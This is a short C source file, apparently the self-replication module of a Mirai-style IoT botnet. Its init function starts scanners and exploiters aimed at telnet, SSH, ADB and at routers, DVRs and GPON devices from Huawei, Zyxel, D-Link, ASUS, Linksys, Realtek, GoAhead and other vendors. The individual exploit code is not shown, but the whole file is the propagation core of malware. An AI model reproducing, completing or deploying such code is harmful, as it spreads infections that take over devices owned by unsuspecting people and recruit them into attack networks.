#include "includes.h"
#include "selfrep.h"

#ifdef SELFREP

#include "selfrep_scanner.h"
#include "selfrep_ssh.h"
#include "selfrep_huawei.h"
#include "selfrep_zyxel.h"
#include "selfrep_dvr.h"
#include "selfrep_zhone.h"
#include "selfrep_fiber.h"
#include "selfrep_hilink.h"
#include "selfrep_thinkphp.h"
#include "selfrep_telnetbypass.h"
#include "selfrep_adb.h"
#include "selfrep_dlink.h"
#include "selfrep_asus.h"
#include "selfrep_jaws.h"
#include "selfrep_linksys.h"
#include "selfrep_linksys8080.h"
#include "selfrep_hnap.h"
#include "selfrep_netlink.h"
#include "selfrep_tr064.h"
#include "selfrep_realtek.h"
#include "selfrep_goahead.h"
#include "selfrep_gpon_scanner.h"

void selfrep_init(void) {
    telnet_scanner_init();
    ssh_scanner_init();
    huawei_scanner_init();
    zyxel_scanner_init();
    dvr_scanner_init();
    zhone_scanner_init();
    fiber_scanner_init();
    hilink_scanner_init();
    thinkphp_scanner_init();
    telnetbypass_scanner_init();
    exploit_init();
    dlinkscanner_scanner_init();
    asus_scanner_init();
    jaws_scanner();
    linksys_scanner_init();
    linksysscanner_scanner_init();
    hnapscanner_scanner_init();
    netlink_scanner();
    tr064_scanner_init();
    realtek_scanner();
    goahead_init();
    gpon_scanner_init();
}

#endif
